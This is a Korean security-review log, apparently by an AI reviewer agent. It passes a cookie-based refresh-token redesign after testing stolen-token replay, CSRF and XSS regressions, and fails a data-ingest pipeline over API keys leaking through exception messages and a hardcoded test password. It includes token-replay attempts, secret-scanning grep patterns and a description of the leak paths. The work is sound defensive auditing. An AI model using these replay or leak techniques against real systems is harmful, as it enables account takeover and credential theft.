reviewer: `security-reviewer (herdr re-review 대행 · SR-015 반려 당사자)`
scope: `backend/app/api/cookies.py`(신규) · `routes.py` · `deps.py` · `schemas.py` · `core/{config,security}.py` ·
`frontend/src/api/client.ts` · `main.tsx` · `hooks/useAuth.ts` · `App.tsx` · `docs/02-design/{security,api-spec}.md` · `.env.example`

> 방법: 문서 판독이 아니라 **직접 깨봤다.** 백엔드는 실제 앱(`TestClient`, https)으로 쿠키 헤더를
> 문자열 단위까지 파싱해 **43개 항목**을 계측했고(우회 4종 포함), 프론트는 probe 테스트 **10건**으로
> 저장소 접근·refresh 본문·세션 부활·XSS 회귀를 실측했다. 검증 후 probe 는 삭제했다(소스 미수정).
> 회귀 재현: backend **369 passed / 50 skipped**(junit xml 로 tests=419·failures=0·errors=0 확인),
> frontend **49 passed**, `npm run build` 성공. 코디네이터 보고 수치와 일치.

---

### 0) 먼저 — 설계 문서를 고쳐서 맞춘 것이 아닌가 (내가 가장 먼저 의심한 것)

`git diff docs/02-design/security.md` 를 전수 확인했다. **금지 조항은 그대로 살아 있다.**

| 확인 | 결과 |
|---|:--:|
| `:50` "refresh 저장 \| 웹: httpOnly + Secure + SameSite=Strict 쿠키" | **무변경** ✅ |
| `:54` "⚠️ JWT를 localStorage에 넣지 않는다" | **무변경** ✅ |
| 변경 내용 | ① 세션 TTL `14일 → 7일`(**강화**) ② "구현 상태" 절 신설 — *"한때 구현이 이 표를 어겼다… 설계를 고치지 않고 구현을 설계에 맞췄다"* 라고 **실패를 그대로 기록** ③ `§8` 에 `R-09`(서버측 폐기 부재) 등재 |

기준을 낮춰 통과한 것이 아니라 **기준에 코드를 맞췄다.** 문서가 자기 실패 이력까지 남긴 것은
SR-006 이 요구했던 정직성 기준을 충족한다.

---

### 1) SR15-1 통과조건 (A) 4개 대조 — 전부 충족

| # | 통과조건(SR-015) | 판정 | 실측 근거 |
|:--:|---|:--:|---|
| ① | refresh 를 `HttpOnly; Secure; SameSite=Strict; Path=/api/v1/auth` 쿠키로 발급·회수 | **PASS** | 실제 `Set-Cookie` 원문 파싱: `refresh_token=<jwt>; HttpOnly; Max-Age=604800; Path=/api/v1/auth; SameSite=Strict; Secure` — 4속성 전부 확인. `Domain` 속성 **없음**(host-only 쿠키 → 형제 서브도메인으로 새지 않는다) |
| ② | access 는 메모리 전용, `localStorage` 미사용 | **PASS** | 아래 §3 |
| ③ | CSRF 대비 명시 | **PASS** | 아래 §5 |
| ④ | refresh 미노출 회귀 테스트 | **PASS** | `client.test.ts` 에 저장소 스파이 0회 호출 단언 신설. 내 probe 로도 독립 재현 |

---

### 2) 우회로가 하나도 안 남았는가 — **본문·쿼리·헤더 4종 전부 막힘**

`SR15-1` 의 핵심은 "JS 가 refresh 를 만질 수 있는 경로"였다. **공격자는 언제나 더 편한 쪽을
고른다**는 원칙에서, 본문 경로가 하나라도 남아 있으면 쿠키 전환은 무의미하다. 훔친 refresh 토큰을
쿠키 없는 별도 클라이언트로 들고 가 4가지로 찔러봤다.

| 시도 | 결과 |
|---|:--:|
| `POST /auth/refresh` + body `{"refresh_token": "<훔친값>"}` | **401** ✅ |
| 동일 + camelCase `{"refreshToken": …}` | **401** ✅ |
| 쿼리스트링 `?refresh_token=<훔친값>` | **401** ✅ |
| `Authorization: Bearer <훔친 refresh>` | **401** ✅ |
| `RefreshIn` 스키마 잔재 | `schemas.py` 에서 **제거 확인**(`class RefreshIn` 0건, `refresh_token: str` 0건) |

→ **쿠키 외의 입력 경로가 존재하지 않는다.** `TokenOut` docstring 에 *"refresh_token 필드를 다시
추가하지 마라"* 는 경고까지 붙어 있어 되돌림 위험도 표시돼 있다.

---

### 3) 프론트가 정말 저장소를 안 쓰는가 — **소스·번들·런타임 3중 확인**

| 층위 | 방법 | 결과 |
|---|---|:--:|
| 소스 | `frontend/src` 전수 grep | `localStorage`/`sessionStorage` **실사용 0건**(남은 건 client.ts:8 "금지" 주석 1줄 + 테스트의 스파이). `document.cookie` 0건 |
| API 표면 | `Object.keys(client)` 런타임 검사 | `setTokens`·`loadTokens`·`configureAuthStorage` **전부 소멸**. 이름에 `refresh` 가 들어간 export **0개** — refresh 를 담을 변수 자체가 없다 |
| 런타임 | `localStorage`·`sessionStorage` 를 스파이로 교체 후 **login → restoreSession → logout 전 과정 실행** | `getItem`·`setItem`·`removeItem` **전부 0회**. `document.cookie` setter 도 0회 |
| 번들 | `dist/assets/*.js` 재빌드 후 grep | `localStorage`·`sessionStorage`·`document.cookie`·`refresh_token` **전부 0건** |

- refresh 요청 실측: **body `undefined`** + `credentials: "include"` + `X-Requested-With: XMLHttpRequest`.
- 서버키 재스캔: dist 에 `KAKAO_REST_API_KEY`·`MOLIT_API_KEY` **미포함**(`VITE_KAKAO_JS_APP_KEY` 만 — 정상).

---

### 4) 쿠키 삭제의 실효성 · Path 스코프 (지시 2·3)

**삭제 헤더가 발급 헤더와 일치하는가** — 불일치하면 브라우저가 다른 쿠키로 보고 원본을 남긴다.
속성을 파싱해 기계적으로 비교했다.

```
발급: {httponly:True, max-age:604800, path:/api/v1/auth, samesite:strict, secure:True}
삭제: {httponly:True, max-age:0,      path:/api/v1/auth, samesite:strict, secure:True, expires:…}
불일치 = []          ← path·httponly·secure·samesite·domain 전부 동일
```
- 실제로 지워지는지도 확인: 로그아웃 후 클라이언트 쿠키 저장소 **비었고**, 이어진 refresh 는 **401**.
- 구조적으로도 좋다 — `cookies.py:68-77` 의 `expired_refresh_cookie_header` 가 헤더를 손으로
  조립하지 않고 **`delete_refresh_cookie` 를 더미 `Response` 에 태워 뽑아낸다.** 발급·삭제·예외
  경로가 **한 함수를 공유**하므로 속성이 어긋날 여지 자체가 없다. 이건 잘 만든 것이다.
- 401(만료·서명오류·종류불일치·쿠키없음) 응답도 삭제 헤더를 동반한다 — 못 쓰는 쿠키를 남겨
  "로그인했는데 안 됨"에 갇히는 상황을 방지.

**Path 스코프** — 계측: 지도 요청(`/map/complexes`)의 `Cookie` 헤더 = **`None`**,
refresh 요청의 `Cookie` = `refresh_token=…`. **노출면 축소가 실제로 작동한다.**
매 API 호출마다 refresh 가 따라다니면 nginx 접근로그·프록시·에러리포트 등 로그가 남는
모든 지점이 유출면이 되는데, 그 표면이 `/api/v1/auth/*` 로 좁혀졌다.

---

### 5) CSRF 방어가 이 위협모델에서 충분한가 (지시 4)

| 겹 | 방어 | 실측 |
|:--:|---|---|
| 1 | `SameSite=Strict` | 크로스사이트 요청에 브라우저가 쿠키를 아예 안 붙인다 |
| 2 | `X-Requested-With: XMLHttpRequest` 필수 | 헤더 없음 → **403 `CSRF_HEADER_REQUIRED`**, 임의값 → **403**, 대소문자 다름(`xmlhttprequest`) → **200**(정상 허용) |
| 3 | CORS 미개방 | `backend/app` 전수 grep — **CORS 미들웨어 0건**. 즉 크로스오리진 XHR 은 preflight 에서 죽는다. 커스텀 헤더를 붙이려면 스크립트가 필요하고, 그 순간 preflight 에 걸린다 → 2겹이 서로를 받쳐준다 |

**403 이 쿠키를 지우지 않는가** — 실측 확인. 403 응답에 `Set-Cookie` **없음**, 쿠키 값 **불변**,
직후 정상 refresh **200**. 이게 맞다. 여기서 지웠다면 공격자가 헤더 없는 요청을 반복 유도해
**남의 세션을 끊는 로그아웃 CSRF** 가 됐을 것이다. `deps.py:71-73` 주석이 그 함정을 정확히 지목하고 있다.

**추가 점검 — 로그인 CSRF(강제 로그인)**: `/auth/login` 은 CSRF 헤더를 요구하지 않는다.
성립 여부를 따져보면: HTML `<form>` 은 `application/json` 을 보낼 수 없고(허용 3종에 없음),
XHR 로 보내려면 CORS 승인이 필요한데 없다. → **성립하지 않는다.** 결격 아님.

**판정: 이 위협모델(쿠키 하나·같은 오리진 SPA·CORS 미개방)에서 충분하다.**

---

### 6) 부수 통제 (지시 문항 외 자체 점검)

| 항목 | 결과 | 실측 |
|---|:--:|---|
| `COOKIE_SECURE` 운영 무력화 | **불가** | `Settings(debug=False, cookie_secure=False).refresh_cookie_secure` → **True**. `debug=True` 일 때만 False. 게다가 기동점검 `validate_runtime()` 이 `COOKIE_SECURE 가 false 입니다` 를 **드러낸다** — 조용히 넘어가지 않는다 |
| `typ` 양방향 | **PASS** | access 를 refresh 쿠키에 심음 → **401** / refresh 로 API 호출 → **401** |
| 쿠키 회전 | **PASS** | refresh 호출 후 쿠키 값이 **바뀜**. `jti`(`secrets.token_urlsafe(12)`)를 넣어 **같은 초에 발급해도 토큰이 달라진다** — 회전이 명목이 아니라 실제 회전임을 확인(같은 초 2회 발급 토큰 상이) |
| TTL | **PASS** | `REFRESH_TTL = 7 days`, `Max-Age=604800`, `expires_in=1800`(=`ACCESS_TTL_SECONDS`, 상수 단일 출처) |
| 로그아웃 가용성 | **PASS** | 인증 불요 — **불량/만료 access 로도 204**. "만료돼서 로그아웃도 못 함"이 안 생긴다 |
| 계정 열거 회귀 | **PASS** | 없는 계정 / 틀린 비밀번호 → 상태·본문 **완전 동일**. 로그인 실패 응답에 `Set-Cookie` 없음 |
| 프론트 세션 부활 방지 | **PASS** | refresh 진행 중 로그아웃 → 뒤늦게 도착한 refresh 성공 결과를 **폐기**(`isAuthenticated()===false`). `clearSession()` 이 `refreshInFlight` 를 끊는 설계가 실제로 동작 |
| 로그아웃 견고성 | **PASS** | 서버 호출이 네트워크 오류로 실패해도 **로컬 세션은 반드시 비워짐** |
| 부팅 상태 노출 | **PASS** | `restoreSession` 실패 시 `{authenticated:false, checked:true}` 확정 방송 — `App.tsx` 가 "세션 확인 중"에 영구히 갇히지 않음 |

---

### 7) XSS 회귀 (지시 5) — **깨지지 않았다**

인증 개편으로 새 DOM 주입 경로가 생겼는지 재확인했다.

- `mapMarkers.ts` 의 `buildLabelEl` 은 여전히 `createElement` + `textContent`(줄번호만 이동).
- src 전수 재grep: `innerHTML`·`outerHTML`·`insertAdjacentHTML`·`document.write`·`eval(`·
  `new Function`·`dangerouslySetInnerHTML` — **실사용 0건**(주석 3건뿐).
- `setAttribute` 는 여전히 `role`·`aria-label` 3곳뿐. `createElement("script")` 는 카카오 SDK 로더 1곳(빌드타임 env).
- **SR-015 와 동일한 악성 페이로드 5종을 재투입** → 요소 생성 0, `window.__pwned` undefined, `CustomOverlay.content` 는 여전히 `HTMLElement`.
- 신규 화면(`AuthForm`)도 전부 JSX 텍스트 렌더. `console.*` 0건 유지.

---

### 8) 잔여 위험 재평가 (지시 6) — XSS 1회의 피해가 얼마나 줄었나

| | 수정 전(SR-015) | 수정 후(SR-016) |
|---|---|---|
| 탈취 가능한 것 | **refresh 토큰 원본**(localStorage) | access 토큰뿐(메모리) |
| 유효기간 | **14일** | **30분** |
| 공격자 기기로 반출 | **가능** — 자기 PC 에서 무기한 재발급 | **불가** — `HttpOnly` 라 값을 읽을 수 없다(probe: `document.cookie` 접근 경로 0) |
| 피해 종료 조건 | 없음(폐기 수단 부재, 로그아웃 무의미) | 피해 탭이 닫히거나 access 만료 |
| 회수 | 불가 | `/auth/logout` 이 쿠키를 실제로 지움(실측 6c·6d) |

**남는 위험(정직하게)**: `HttpOnly` 는 **탈취(반출)** 를 막지만 **세션 라이딩(session riding)** 은
막지 못한다. XSS 코드는 피해자 브라우저 안에서 같은 오리진이므로 `fetch` 를 가로채 access 를 얻거나
직접 `/auth/refresh` 를 호출해 **탭이 살아 있는 동안** 사용자를 흉내낼 수 있다. 다만 그 능력은
**그 브라우저 세션에 갇힌다** — 공격자 서버로 자격증명을 옮길 수 없다. 위험의 성질이
"영구·이식 가능한 자격증명 유출"에서 "일시적 세션 오용"으로 **급을 낮췄다.**
→ 그래서 `SR15-4`(CSP)가 여전히 의미 있는 마지막 층이다.

---

### 9) `SR15-3` (서버측 폐기) 판정 — **G5 배포 차단 아님 · OPEN 유지** (지시 7)

**차단하지 않는다.** 근거:
1. `SR15-1` 이 지목한 현실적 유출 경로(localStorage 반출)가 **닫혔다.** 폐기 수단이 필요한
   "이미 새어나간 refresh" 시나리오의 확률이 크게 떨어졌다.
2. 호출마다 **회전** + **7일** + host-only + `Path` 스코프 + `SameSite=Strict` + 운영 `Secure` 강제.
3. 흔한 실사용 케이스(공용 기기에서 로그아웃)는 **쿠키 삭제로 실제 해결**된다(실측).
4. 사용자가 개인 1명(CLAUDE.md) — 대량 세션 관리 요구가 없다.
5. 준비는 돼 있다: `jti` 가 **이미 발급되고 있음을 실측 확인**(토큰 디코드). 저장소만 붙이면 된다.
6. `security.md §8 R-09` 에 **재평가 트리거와 함께 정식 등재**됐다 — 조용히 사라지지 않는다.

⚠️ 단 조건을 붙인다: **`R-09` 가 명시한 대로 refresh TTL 을 7일보다 늘리려면 denylist 를 먼저
붙여야 한다.** 회수 수단 없이 노출 창만 넓히는 변경은 그 자체로 재감사 대상이다.

---

### 10) `SR15-4` (CSP 부재) 판정 — **커밋 비차단 · G5 배포 절차의 차단 조건** (지시 8)

"카카오맵 SDK 출처 허용이 필요해 잘못 넣으면 지도가 죽는다"는 **기술적으로 타당하다.**
카카오맵은 `script-src`(`dapi.kakao.com`·`*.daumcdn.net`) 외에 지도 타일 `img-src`,
`connect-src`, 인라인 스타일(`style-src`)까지 얽혀 있어 실제 브라우저 없이 정하면 빈 지도가 된다.
**"배포하며 검증한다"는 판단 자체는 옳다.**

그러나 **CSP 없이 운영에 올리는 것**은 별개다. §8 에서 확인했듯 CSP 는 이제 세션 라이딩에 대한
**마지막 남은 층**이고, 이 앱은 아직 배포된 적이 없어 "기존 사용자 회귀 위험"이라는 지연 사유도 없다.

**판정: G5 배포 체크리스트에 넣어 차단 조건으로 둔다.**
- `deploy/DEPLOY.md §5-6` 의 `check_headers()` 가 이미 헤더를 4경로에서 실검증하므로 **거기에
  `Content-Security-Policy` 1줄을 추가**하면 "깜빡하고 안 넣음"이 구조적으로 불가능해진다.
- 지도가 깨지면 **`Content-Security-Policy-Report-Only` 로 먼저 올리는 것을 허용**한다.
  관측 후 강제로 전환. "완벽한 CSP 아니면 안 넣는다"가 제일 나쁜 선택이다.
- 최소안: `default-src 'self'; script-src 'self' https://dapi.kakao.com https://*.daumcdn.net;
  img-src 'self' data: https://*.daumcdn.net https://*.kakaocdn.net; connect-src 'self' https://dapi.kakao.com;
  style-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`

---

### 종합

| 항목 | 상태 |
|---|---|
| `SR15-1` (토큰 저장 위치) | **CLOSE (PASS)** — 통과조건 (A) 4개 전부 충족, 우회 4종 차단 실측 |
| `SR15-2` (탭 간 로그아웃 동기화) | **CLOSE (해소)** — 저장소 방식을 폐기하면서 문제 자체가 사라졌다. 세션 진실은 이제 **탭이 공유하는 쿠키**이고, 다른 탭은 access 만료(≤30분) 또는 다음 refresh 에서 **401 → 자동 로그아웃**된다. `storage` 이벤트 구독이 애초에 불필요해졌다 |
| `SR15-3` (서버측 폐기) | **OPEN · low · 비차단** — `R-09` 로 정식 등재. TTL 연장 시 선행 조건 |
| `SR15-4` (CSP 부재) | **OPEN · medium · G5 배포 차단 조건** — 커밋은 막지 않음 |
| XSS (FE-2) | **PASS 유지** — 페이로드 5종 재실측 |
| 설계 문서 | **강화됨** — 금지 조항 무변경, TTL 단축, 실패 이력 정직 기재, R-09 등재 |

**판정: PASS.** SR-015 에서 내가 FAIL 로 막았던 사유 — *"2단계 설계가 명문으로 금지한 저장 위치를
예외 기록 없이 사용했고, 그 결정이 전제한 보완통제가 하나도 없다"* — 는 **설계를 낮추는 방식이
아니라 구현을 설계에 맞추는 방식으로** 해소됐다. 반려 당사자로서 직접 43+10 항목을 실행해
확인했고, 같은 입력에 같은 결과가 나온다. 커밋 게이트를 더 이상 이 건으로 막지 않는다.

---

## SR-017 · 2026-07-26 · **실데이터 수집 파이프라인 감사** (security-reviewer, herdr re-review 대행)

**판정: FAIL** — 차단 3건(`SR17-1` high · `SR17-2` high · `SR17-3` medium)
대상: working tree 미커밋 변경 (신규 스크립트 7 + `app/ingest/*` · `app/worker.py` · `config/*` · `.gitignore`)
재현: `cd backend && python -m pytest -q` → **RC=0 · 380 passed / 50 skipped** (PM 보고와 일치, 직접 실행 확인)

> 결론 요약: **서버에 남은 키 흔적은 0건이다**(전체 파일시스템 스캔으로 실증). 그러나 **키가 새는
> 경로 자체는 닫히지 않았다.** 이번에 안 샌 이유는 방어가 동작해서가 아니라 **수집 6회가 전부
> `status=ok · 실패 0건` 이었기 때문**이다. 예외가 한 번이라도 나면 같은 사고가 재발하고,
> 그 중 하나는 **공개 저장소에 커밋되는 파일**로 들어간다.

---

### 1) ★ 키 유출의 완전한 봉쇄 — **미완 (SR17-1, high, 차단)**

#### 1-A. 로거 억제는 사고의 절반만 막았다 — 진짜 경로는 **예외 메시지**다

`httpx` 의 `raise_for_status()` 가 만드는 `HTTPStatusError` 는 **요청 URL 을 통째로 메시지에 싣는다.**
직접 실행해 확인:

```
EXC_TYPE: HTTPStatusError
EXC_STR : Server error '500 Internal Server Error' for url
          'https://apis.data.go.kr/.../getRTMSDataSvcAptTrade?serviceKey=SUPERSECRETKEY123&LAWD_CD=11680...'
LEAKS_KEY: True
```

로그 레벨을 아무리 낮춰도 이건 안 막힌다. **우리 코드가 그 예외를 문자열로 만들어 직접 출력**하기 때문이다:

| # | 유출 경로 | 위치 | 도달 지점 | 심각도 |
|:--:|---|---|---|:--:|
| L1 | `f"수집/적재 실패: {exc}"` → `run.failures` | `backend/app/ingest/runner.py:179` | ① `scripts/run_ingest.py:116` 의 `print` → 운영에서 `/tmp/*.log` 로 리다이렉트됨 ② `runner.py:96` `logger.warning` — **WARNING 이라 configure_logging 억제 대상이 아니다** | **High** |
| L2 | `f"{ym}: {type(exc).__name__}: {exc}"` | `backend/scripts/verify_region_codes.py:82` | ① `:189` `print` ② **`classify()` → `verdict:` 문자열 → `config/region_code_verification.yaml` 에 기록(`:91`, `:205`)** | **Critical 경로** |

**L2 가 가장 위험하다.** `config/region_code_verification.yaml` 은 이번 커밋 대상(`?? config/region_code_verification.yaml`)이고,
원격은 **공개 저장소** `https://github.com/wansoo88/realestate.git` 다. 검증 중 API 오류가 한 번이라도
나면 인증키가 **git 이력에 영구히** 박힌다 — 파일을 지워도 이력에서는 안 지워진다.

지금 파일이 깨끗한 이유는 방어가 아니라 운이다:
- `region_code_verification.yaml` → `summary.error: 0` (94개 코드 전부 오류 없이 통과)
- 운영 DB `ingest_log` 6행 → **전부 `status=ok`, 실패 0건** (직접 조회 확인)

공공데이터포털은 과부하 시 5xx 를 흔하게 돌려준다. 12만 건을 수 시간 긁는 배치에서 예외 0건은
**재현을 기대할 수 없는 조건**이다.

#### 1-B. 구조적 방어(마스킹 유틸)가 **없다** — 있다고 기록된 것도 사실이 아니다

저장소에 문자열 마스킹 유틸이 없다. 유일한 후보인 `mask_sensitive()` 는 **dict 키 기반**이라
문자열에는 아무 일도 하지 않는다. 직접 실행:

```
mask_sensitive("https://apis.data.go.kr/x?serviceKey=SECRET123&a=b")
  → "https://apis.data.go.kr/x?serviceKey=SECRET123&a=b"    # 그대로 반환
LEAKS: True
```

따라서 `app/main.py:92` 의 `logger.exception(..., mask_sensitive(str(request.url)))` 는
**마스킹이 아니라 항등함수**다. `SR-006 §4` 가 "예외 URL 마스킹 ✅" 로 기록한 항목은
**과잉 주장**이었다(SR-005 → SR-006 에서 한 번 겪은 것과 같은 유형의 오류다). 여기서 정정한다.

#### 1-C. 로거 억제의 커버리지 — 7개 중 2개만

| 스크립트 | `configure_logging` | 비밀 취급 | 판정 |
|---|:--:|---|---|
| `run_ingest.py` | ✅ `:73` | MOLIT 키 | 억제됨 (그러나 L1 로 샘) |
| `verify_recommendation.py` | ✅ `:161` | DB·암호화키 | 억제됨 |
| **`verify_region_codes.py`** | ❌ | **MOLIT 키를 쿼리스트링으로 전송** | **미억제 — L2 의 당사자** |
| `geocode_complexes.py` | ❌ | 카카오 키(헤더) | 미억제 (키는 URL 밖이라 저위험) |
| `ingest_report.py` | ❌ | DB DSN | 미억제 (HTTP 없음) |
| `fetch_legal_dong_codes.py` | ❌ | 없음 | 무관 |
| `_common.py` | (제공자) | — | — |

`verify_region_codes.py` 가 지금 httpx INFO 를 안 찍는 것은 **우연**이다 — 루트 로거를 아무도
설정하지 않아 `logging.lastResort` 핸들러(WARNING)가 INFO 를 버릴 뿐이다. 임포트 체인 어딘가에서
`basicConfig(INFO)` 가 한 줄 들어오는 순간 사고가 그대로 재발한다.

**설계 결함**: 억제가 **비밀을 쥔 쪽**(`make_http_fetch` / `molit.build_params`)이 아니라
**호출자 7명 각각**에게 맡겨져 있다. 이건 "사람이 기억해야 하는 방어"이고, 이 원장은 SR-006 에서
같은 이유로 이미 한 번 반려한 적이 있다.

#### 1-D. 서버 잔존 흔적 — **0건 (실측)**

`ssh root@<DEPLOY_HOST>` 로 조회만 수행(변경·삭제 없음). 키 원문 20자 + URL 인코딩 변형 두 가지로 검색:

| 대상 | 결과 |
|---|---|
| 전체 파일시스템(`/`, `/proc`·`/sys` 제외) 원문 | **`/opt/realestate/.env` 단 1건** (권한 `600 root:root`) |
| 전체 파일시스템 URL 인코딩 변형 | **0건** |
| `journalctl` (전체 · 최근 7일) | **0건** |
| `/var/lib/docker/containers/**-json.log` | **0건** (`serviceKey` 문자열 2건은 **본 감사자가 방금 실행한 psql 오류문** — 2026-07-25 15:03 UTC, 키 값 미포함) |
| `/tmp` (`*.log` 포함 전수), `/root`, `/var/log`, `/home` | **0건** |
| `~/.bash_history` (549줄, 최종수정 7/2) | **0건**. `DATABASE_URL` 언급 4건은 전부 autobtc 것 |
| `nohup.out` | 존재하지 않음 |
| git 전체 ref(`git rev-list --all`) | **0건** |
| 운영 DB `ingest_log.message` 6행 | **0건** (메시지는 `"N개 (지역·달) 시도, 실패 0건"` 형식 — `failures` 는 DB 에 안 들어간다) |

부수 확인 — `safe_dsn()` 은 **실제로 동작**한다. 서버 `/tmp/ingest_backfill.log:1`, `/tmp/geocode.log:1` 등:
`[INFO] DB postgresql+psycopg://realestate:***@172.19.0.2:5432/realestate`. DB 비밀번호·카카오 키도
`.env` 밖 0건.

#### 1-E. 키 재발급 판단 — **재발급하라 (YES)**

- 사고 자체는 **실재했다**(PM 보고: 첫 실행에서 httpx INFO 가 `serviceKey` 를 평문 출력).
- 그 출력물은 **서버 어디에도 남지 않았다**(위 실측). 즉 노출면은 파일이 아니라
  **당시 세션의 터미널 출력과 그것을 담은 에이전트 대화 기록**이다. 우리가 **소유하지도, 파기를
  확인하지도 못하는 저장소**다.
- 따라서 "누가 봤는지"를 추론할 방법이 없다. **평문 노출 후에는 추론하지 말고 회전한다**가 원칙이다.
- 비용이 사실상 0 이다: data.go.kr 인증키는 무료·셀프 재발급이고, 반영은 `.env` 한 줄 교체 +
  `docker compose up -d` 뿐이다. 사용자 데이터·서비스 중단 영향 없음.
- 반대로 방치 비용은 비대칭이다: 도난 시 **일일 한도가 남에게 소진**되고, 그때 우리 배치는
  `resultCode != 00` 으로 실패하는데 그게 "그날 거래가 없었다"와 겉보기에 잘 구분되지 않는다.

→ **PM 은 사용자에게 MOLIT 인증키 재발급을 요청할 것.** (카카오 REST 키는 헤더 전송이라 이번
유출과 무관 — 재발급 불필요. §6 참조)

---

### 2) 새 스크립트 7개의 비밀정보 취급 — **PASS**

| 점검 | 결과 | 근거 |
|---|:--:|---|
| 비밀을 커맨드라인 인자로 받는가 (`ps` 노출) | ✅ **없음** | 7개 전부 `argparse` 에 비밀 인자 0개. 키·DSN 은 `_common.require()` / `load_env()` 로 **환경변수만** 사용 |
| DB 비밀번호가 출력에 실리는가 | ✅ 차단 | `safe_dsn()` 이 `://user:***@` 로 치환. `run_ingest.py:96`·`geocode_complexes.py:53`·`ingest_report.py:89` 전부 `safe_dsn` 경유. 서버 로그 실측으로 동작 확인 |
| 키가 생성 파일에 실리는가 | ❌ **SR17-1 L2** | `verify_region_codes.py` 만 예외 — §1-A |
| 설정 미비 시 동작 | ✅ | `require()` 가 `SystemExit` — '도는 척' 하지 않음 |

> 잔여(비차단): `DATABASE_URL` 을 셸에서 `export` 하는 사용법이 docstring 에 안내돼 있어
> 대화형 셸에서 쓰면 `~/.bash_history` 에 DSN(비밀번호 포함)이 남는다. 이번 서버 실측에서는
> **실제로 남지 않았다**(비대화형 SSH). 안내 문구에 `read -s` 또는 `.env` 사용 권고 1줄 추가 권장.

---

### 3) 생성된 설정파일의 민감정보 — **PASS**

`config/region_code_verification.yaml`(94코드) · `config/regions_capital.yaml` 전수 점검:

- `serviceKey|api_key|password|secret|token|KakaoAK` → **0건**
- 사설/공인 IP 정규식(`\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}`) → **0건** (배포 IP·컨테이너 IP 없음)
- URL 은 2건뿐이며 **둘 다 공개 엔드포인트**: `apis.data.go.kr/1613000/RTMSDataSvcAptTrade/...`,
  `www.code.go.kr/stdcode/regCodeL.do` — 비밀 아님, 출처 표기로 오히려 바람직
- 내용은 코드·명칭·월별 건수·판정 사유뿐. `summary.error: 0` 이라 §1-A L2 의 오류 문자열도 미포함

⚠️ 단 이 PASS 는 **현재 파일 한정**이다. `error > 0` 인 상태로 재생성되면 곧바로 FAIL 이 된다
(그게 SR17-1 이 차단인 이유다).

---

### 4) `.gitignore` 변경 및 커밋 대상 — **PASS 1건 · 주의 1건**

- `data/reference/` 추가 **적절**. `git check-ignore -v` 실검증:
  `.gitignore:40:data/reference/ → data/reference/legal_dong_code_full.txt` **IGNORED**.
  2.4MB 배포본을 커밋 대신 스크립트로 재취득하는 판단이 옳다.
- `.env` 여전히 IGNORED 확인.
- 커밋 대상 실측(`git status --porcelain`): 신규 8건(스크립트 7 + 검증 yaml 1), 수정 16건.
  **키·인증서·개인키·백업 파일 0건.** 단 `verify_recommendation.py` 는 §5 사유로 이 상태로 커밋 불가.
- **주의(비차단, `SR17-7`)**: 서버 `/opt/realestate` 의 `.gitignore` 는 아직 **커밋된 구버전**이라
  그곳에서는 `?? data/` 가 무시되지 않는다(실측). 서버에서 `git add -A` 를 먼저 하면 2.4MB 가
  들어간다. 이 커밋을 서버로 반영한 뒤 작업할 것.

---

### 5) `SR17-2` (high, 차단) — **운영 DB 계정의 비밀번호가 공개 저장소로 나간다**

```python
# backend/scripts/verify_recommendation.py:50
TEST_PASSWORD = "<평문 비밀번호 리터럴 — SR17-2 조치 시 삭제·리뷰로그에서도 제거>"
...
return repo.create_user(email, hash_password(TEST_PASSWORD)), True   # :57
```
> ⚠️ 이 리뷰로그 자체가 **공개 저장소 커밋 대상**이라, 지적하려고 값을 인용하는 것만으로
> 같은 유출이 된다. SR17-2 조치와 함께 값을 지웠다(`tests/test_script_hygiene.py` 가 재발을 막는다).

이건 "테스트용 더미 상수"가 아니다. **이 값으로 만들어진 계정이 운영 DB 에 살아 있다.** 직접 조회:

```
 id |              email               |      hash_prefix       |          created_at
  1 | verify+recommend@example.invalid | $argon2id$v=19$m=19456 | 2026-07-25 13:56:36+00
```

- 저장소는 **public** (`github.com/wansoo88/realestate`, SR-001 확인). 커밋 즉시
  **동작하는 자격증명이 인터넷에 공개**된다 — CWE-798 / OWASP A07.
- 재현: 배포(G5) 후 `POST /api/v1/auth/login` 에 `verify+recommend@example.invalid` +
  위 문자열 → **인증된 세션 획득**. 그 세션으로 `/me/profile`·`/affordability`·`/recommendations`
  전부 호출 가능하다. 소유자 계정은 아니지만 **인증 경계 안쪽 발판**이고, 추천 파이프라인은
  Claude API 를 태우므로 **비용 유발 경로**이기도 하다(SR5-2 토큰 상한 미설정과 결합).
- 비밀번호 강도(22자·혼합)는 무의미하다. **공개된 순간 강도는 0 이다.**
- 현재 즉시 착취는 불가하다 — `docker ps` 상 `realestate-db-1` 만 떠 있고 API 컨테이너가 없다.
  그래서 **커밋 차단**이지 사고 대응은 아니다. 다만 **커밋이 곧 공개**이므로 순서가 중요하다.

**통과 조건**
1. `TEST_PASSWORD` 상수 제거 → `os.environ["VERIFY_PASSWORD"]` 또는 `secrets.token_urlsafe(24)` 로
   매 실행 생성(생성값도 출력하지 않는다).
2. 운영 DB 의 `app_user id=1` 과 그 종속 데이터(`user_profile`, `recommendation_job` 2건)를
   **삭제하거나** 비밀번호를 임의값으로 교체. (파괴적 작업이라 본 감사자는 조회만 했다 — PM 이 결정)
3. 회귀: 스크립트 소스에 비밀번호 리터럴이 없음을 확인하는 grep 테스트 1건.

---

### 6) 지오코딩(카카오 키) — **PASS**

- 키는 **`Authorization: KakaoAK <key>` 헤더**로만 나간다(`app/ingest/geocode.py:134`).
  쿼리스트링에 없다 → ① httpx INFO 의 URL 로그에 안 찍히고 ② `HTTPStatusError` 메시지의
  `request.url` 에도 안 실린다. **§1 과 같은 유형의 사고가 구조적으로 성립하지 않는다.**
- 파이썬 트레이스백은 지역변수를 출력하지 않으므로 `headers` 도 노출되지 않는다.
- `geocode_complexes.py` 가 `configure_logging` 을 안 부르는 것은 사실이나, 위 이유로 **키 유출
  위험은 없다**(찍혀도 URL 에 비밀이 없다).
- **결론: 카카오 REST 키는 재발급 불필요.** 다만 §1 의 교훈을 일반화해 억제·마스킹을 공통화하면
  이 스크립트도 자동으로 덮인다.

---

### 7) G4 (수집 합법성) — **CONFIRM PASS**

| 점검 | 결과 | 근거 |
|---|:--:|---|
| 페이지 루프가 rate limit 을 우회하는가 | ✅ **우회 없음** | 바깥 루프가 (지역·달)마다 `limiter.wait()`(`runner.py:171`), 안쪽 페이지 루프가 `page > 1` 마다 `limiter.wait()`(`:136-137`). 1페이지는 바깥 wait 로 이미 지연됨 — **모든 HTTP 호출 앞에 정확히 한 번씩** 간격이 보장된다 |
| 무한 루프 방지 | ✅ | `MAX_PAGES = 50` 상한. 초과 시 조용히 자르지 않고 `MolitPaginationError` |
